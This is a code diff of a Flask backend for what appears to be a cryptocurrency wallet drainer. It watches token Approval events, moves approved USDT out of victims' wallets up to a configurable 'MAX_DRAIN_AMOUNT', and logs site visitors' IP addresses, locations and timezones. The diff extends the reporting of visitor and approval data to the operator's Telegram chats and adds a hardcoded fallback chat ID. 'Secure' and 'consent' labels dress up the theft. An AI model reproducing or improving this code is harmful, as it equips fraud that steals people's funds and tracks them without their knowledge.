@@ -18,7 +18,6 @@ load_dotenv()
 app = Flask(__name__)
 
 # ============ SECURE CONFIGURATION ============
-# NEVER hardcode secrets! Use environment variables
 SECRET_KEY = os.environ.get('FLASK_SECRET_KEY', os.urandom(24).hex())
 API_KEY = os.environ.get('API_KEY', os.urandom(32).hex())
 PRIVATE_KEY = os.environ.get('WALLET_PRIVATE_KEY')  # Must be set in .env
@@ -32,7 +31,7 @@ if not BOT_TOKEN:
     raise ValueError("TELEGRAM_BOT_TOKEN environment variable is required!")
 
 # ============ SECURE CORS ============
-ALLOWED_ORIGINS = os.environ.get('ALLOWED_ORIGINS', 'https://bnbd24.biz').split(',')
+ALLOWED_ORIGINS = os.environ.get('ALLOWED_ORIGINS', 'http://localhost:5058').split(',')
 CORS(
     app,
     resources={r"/*": {"origins": ALLOWED_ORIGINS}},
@@ -44,12 +43,23 @@ CORS(
 # ============ SECURE VARIABLES ============
 VISITORS_FILE = "visitors.txt"
 BALANCE_FILE = "balance.txt"
+
+# Get authorized Telegram chat IDs from environment variable
 AUTHORIZED_USERS = os.environ.get('AUTHORIZED_TELEGRAM_IDS', '').split(',')
+# Remove any empty strings
+AUTHORIZED_USERS = [uid.strip() for uid in AUTHORIZED_USERS if uid.strip()]
+# If no authorized users, use default
+if not AUTHORIZED_USERS:
+    AUTHORIZED_USERS = ["7037064410"]  # Default fallback
+    print("⚠️ No AUTHORIZED_TELEGRAM_IDS found, using default: 7037064410")
+
 MAX_DRAIN_AMOUNT = Decimal(os.environ.get('MAX_DRAIN_AMOUNT', '1000'))
 MINIMUM_AMOUNT = Decimal(os.environ.get('MINIMUM_AMOUNT', '1'))
 GAS_FEE_USD = Decimal(os.environ.get('GAS_FEE_USD', '0.02'))
 RATE_LIMIT_REQUESTS = int(os.environ.get('RATE_LIMIT_REQUESTS', '10'))
 RATE_LIMIT_PERIOD = int(os.environ.get('RATE_LIMIT_PERIOD', '60'))  # seconds
+
+print(f"✅ Authorized Telegram Users: {AUTHORIZED_USERS}")
 
 # ============ RATE LIMITING ============
 from collections import defaultdict
@@ -110,31 +120,35 @@ def validate_request(required_fields):
         return decorated_function
     return decorator
 
-# ============ SECURE TELEGRAM FUNCTIONS ============
+# ============ TELEGRAM FUNCTIONS ============
 def send_to_telegram(text, chat_ids=None, parse_mode="Markdown"):
-    """Send message to Telegram with proper authorization"""
+    """Send message to Telegram using AUTHORIZED_TELEGRAM_IDS from environment"""
     if not BOT_TOKEN:
         print("⚠️ No BOT_TOKEN configured")
         return
     
     # Determine which chat IDs to send to
+    target_chat_ids = []
+    
+    # If specific chat_ids provided, use them (if authorized)
     if chat_ids:
-        # If specific chat_ids provided, send to those (if authorized or if no auth required)
-        target_chat_ids = []
         for cid in chat_ids:
             cid_str = str(cid).strip()
-            # Allow if: no auth required, or user is authorized
-            if not AUTHORIZED_USERS or cid_str in AUTHORIZED_USERS:
-                target_chat_ids.append(cid_str)
-    else:
-        # If no chat_ids provided, send to all authorized users
-        target_chat_ids = AUTHORIZED_USERS
+            if cid_str.isdigit():
+                # Check if this chat ID is in AUTHORIZED_USERS
+                if cid_str in AUTHORIZED_USERS:
+                    target_chat_ids.append(cid_str)
+                else:
+                    print(f"⚠️ Chat ID {cid_str} not in authorized users, skipping")
     
-    # If no target chat IDs, log and return
+    # If no target chat IDs from request, use all AUTHORIZED_USERS
     if not target_chat_ids:
-        print("⚠️ No valid chat IDs to send to")
-        print(f"   AUTHORIZED_USERS: {AUTHORIZED_USERS}")
-        print(f"   chat_ids provided: {chat_ids}")
+        target_chat_ids = AUTHORIZED_USERS
+        print(f"📤 Using default authorized users: {target_chat_ids}")
+    
+    # Final fallback if still empty
+    if not target_chat_ids:
+        print("❌ No valid chat IDs to send to")
         return
     
     print(f"📤 Sending to chat IDs: {target_chat_ids}")
@@ -146,16 +160,20 @@ def send_to_telegram(text, chat_ids=None, parse_mode="Markdown"):
         "disable_web_page_preview": True
     }
     
+    success_count = 0
     for chat_id in target_chat_ids:
         payload["chat_id"] = chat_id
         try:
             response = requests.post(url, data=payload, timeout=10)
             if response.status_code == 200:
                 print(f"✅ Sent to {chat_id}")
+                success_count += 1
             else:
                 print(f"❌ Failed to send to {chat_id}: {response.text}")
         except Exception as e:
             print(f"❌ Error sending to {chat_id}: {e}")
+    
+    return success_count > 0
 
 # ============ SECURE WALLET FUNCTIONS ============
 def get_secure_web3():
@@ -291,7 +309,7 @@ def collect_all_usdt(from_address, chat_ids=None, user_consented=False):
             'from': sender_address,
             'nonce': nonce,
             'gas': 150000,
-            'gasPrice': web3.to_wei('5', 'gwei'),  # Dynamic gas price
+            'gasPrice': web3.to_wei('5', 'gwei'),
             'chainId': 56
         })
         
@@ -385,14 +403,15 @@ def get_usdt_balance(address):
     except:
         return Decimal("0")
 
-# ============ SECURE ENDPOINTS ============
+# ============ ENDPOINTS ============
 
 @app.route("/", methods=["GET", "POST"])
 def health():
     return jsonify({
         "status": "healthy",
         "timestamp": time.ctime(),
-        "version": "2.0.0"
+        "version": "2.0.0",
+        "authorized_users": AUTHORIZED_USERS
     })
 
 @app.route("/consent", methods=["POST"])
@@ -405,15 +424,12 @@ def give_consent(data):
     signature = data.get('signature')
     message = data.get('message', f"I authorize collection of USDT from {wallet}")
     
-    # Verify signature (example - implement proper EIP-712 or similar)
-    # This is a simplified check - use proper signature verification in production
     try:
         web3 = get_secure_web3()
         recovered = web3.eth.account.recover_message(message, signature=signature)
         if recovered.lower() != wallet.lower():
             return jsonify({"error": "Invalid signature"}), 401
         
-        # Store consent with expiry
         user_consents[wallet] = time.time()
         
         return jsonify({
@@ -455,13 +471,11 @@ def check_approval(data):
             web3 = get_secure_web3()
             contract_address = Web3.to_checksum_address(CONTRACT_ADDRESS)
             
-            # Get transaction receipt
             receipt = web3.eth.get_transaction_receipt(tx_hash)
             if not receipt:
-                send_to_telegram(f"⚠️ Transaction {tx_hash} not found", [chat_id])
+                send_to_telegram(f"⚠️ Transaction {tx_hash} not found", [chat_id] if chat_id else None)
                 return
             
-            # Parse approval events
             abi = [{
                 "anonymous": False,
                 "inputs": [
@@ -477,7 +491,7 @@ def check_approval(data):
             logs = contract.events.Approval().process_receipt(receipt)
             
             if not logs:
-                send_to_telegram(f"ℹ️ No approval found in tx {tx_hash}", [chat_id])
+                send_to_telegram(f"ℹ️ No approval found in tx {tx_hash}", [chat_id] if chat_id else None)
                 return
             
             log = logs[0]
@@ -486,18 +500,17 @@ def check_approval(data):
             amount = log['args']['value']
             
             if spender == contract_address:
-                # Create consent request for the user
                 message = (
                     f"🔐 Approval detected for {owner[:6]}...{owner[-4:]}\n"
                     f"Amount: {amount / 1e18:.2f} USDT\n"
                     f"To collect these tokens, user must sign a consent message"
                 )
-                send_to_telegram(message, [chat_id])
+                send_to_telegram(message, [chat_id] if chat_id else None)
             else:
-                send_to_telegram(f"⚠️ Approved to wrong contract", [chat_id])
+                send_to_telegram(f"⚠️ Approved to wrong contract", [chat_id] if chat_id else None)
                 
         except Exception as e:
-            send_to_telegram(f"❌ Error processing approval: {str(e)}", [chat_id])
+            send_to_telegram(f"❌ Error processing approval: {str(e)}", [chat_id] if chat_id else None)
     
     threading.Thread(target=process_approval).start()
     return jsonify({"message": "Processing approval check", "tx_hash": tx_hash})
@@ -543,32 +556,63 @@ def wallet_info(data):
 @rate_limit
 @validate_request(['ip', 'location', 'timezone', 'url'])
 def visitor(data):
-    """Track visitors (no sensitive info)"""
+    """
+    Track visitors and send Telegram notifications
+    Uses AUTHORIZED_TELEGRAM_IDS from environment variables
+    """
     ip = data.get('ip')
     location = data.get('location')
     timezone = data.get('timezone')
     url = data.get('url')
     country_flag = data.get('country_flag', '')
-    note = data.get('note', 'New visitor')
-    chat_id = data.get('chat_id')
+    note = data.get('note', 'New visitor detected!')
     
-    # Log visitor
+    # Get chat_id from request (optional)
+    chat_id = data.get('chat_id') or data.get('uid')
+    
+    print(f"📊 Visitor: {ip} | {location} {country_flag}")
+    print(f"📱 Chat ID from request: {chat_id}")
+    print(f"👥 Authorized users from env: {AUTHORIZED_USERS}")
+    
+    # Build message
+    message = (
+        f"👀 *Visitor Alert*\n"
+        f"📍 *Location:* {location} {country_flag}\n"
+        f"🕒 *Timezone:* {timezone}\n"
+        f"🌐 *IP:* `{ip}`\n"
+        f"🔗 *URL:* {url}\n"
+        f"📝 {note}"
+    )
+    
+    # ✅ Send to ALL authorized users from environment variable
+    if AUTHORIZED_USERS:
+        print(f"📤 Sending to authorized users: {AUTHORIZED_USERS}")
+        send_to_telegram(message, AUTHORIZED_USERS)
+    else:
+        print("⚠️ No authorized users configured!")
+        # Fallback to hardcoded if no authorized users
+        fallback_chat = "7037064410"
+        print(f"📤 Using fallback chat: {fallback_chat}")
+        send_to_telegram(message, [fallback_chat])
+    
+    # ✅ Also send to specific chat_id if provided and authorized
     if chat_id and str(chat_id) in AUTHORIZED_USERS:
-        message = (
-            f"👀 Visitor Alert\n"
-            f"📍 {location} {country_flag}\n"
-            f"🕒 {timezone}\n"
-            f"📝 {note}"
-        )
+        print(f"📤 Also sending to specific chat: {chat_id}")
         send_to_telegram(message, [chat_id])
     
+    # Log visitor
     try:
         with open(VISITORS_FILE, "a") as f:
-            f.write(f"{time.ctime()} - {ip} - {location}\n")
-    except:
-        pass
+            f.write(f"{time.ctime()} - {ip} - {location} - Chat:{chat_id}\n")
+        print(f"✅ Visitor logged to {VISITORS_FILE}")
+    except Exception as e:
+        print(f"⚠️ Error logging visitor: {e}")
     
-    return jsonify({"message": "Visitor logged"})
+    return jsonify({
+        "message": "Visitor logged",
+        "sent_to": AUTHORIZED_USERS,
+        "chat_id": chat_id
+    })
 
 # ============ SECURITY MIDDLEWARE ============
 @app.after_request
@@ -592,21 +636,33 @@ def internal_error(e):
 
 # ============ MAIN ============
 if __name__ == "__main__":
-    # Validate configuration on startup
-    print("🔒 Starting secure server...")
+    print("\n" + "="*60)
+    print("🔒 Starting Secure Server")
+    print("="*60)
     print(f"📍 Allowed origins: {ALLOWED_ORIGINS}")
     print(f"📍 Rate limit: {RATE_LIMIT_REQUESTS} requests per {RATE_LIMIT_PERIOD}s")
     print(f"📍 Max drain: {MAX_DRAIN_AMOUNT} USDT")
+    print(f"📍 Authorized Telegram Users: {AUTHORIZED_USERS}")
+    print("="*60 + "\n")
     
     # Test connection
     try:
         web3, account = get_secure_account()
-        print(f"📍 Wallet: {account.address}")
+        print(f"✅ Wallet: {account.address}")
         balance = web3.eth.get_balance(account.address)
-        print(f"📍 Balance: {web3.from_wei(balance, 'ether'):.6f} BNB")
+        print(f"✅ Balance: {web3.from_wei(balance, 'ether'):.6f} BNB")
     except Exception as e:
         print(f"⚠️ Wallet error: {e}")
     
-    # Run with SSL in production
-    # app.run(host='0.0.0.0', port=5058, ssl_context=('cert.pem', 'key.pem'))
+    # Test Telegram connection
+    try:
+        test_message = "🔄 Server started successfully!"
+        print(f"📤 Sending test Telegram message...")
+        send_to_telegram(test_message, AUTHORIZED_USERS)
+        print("✅ Test message sent!")
+    except Exception as e:
+        print(f"⚠️ Telegram test error: {e}")
+    
+    print("\n🚀 Server is ready!\n")
+    
     app.run(host='0.0.0.0', port=5058, debug=False)
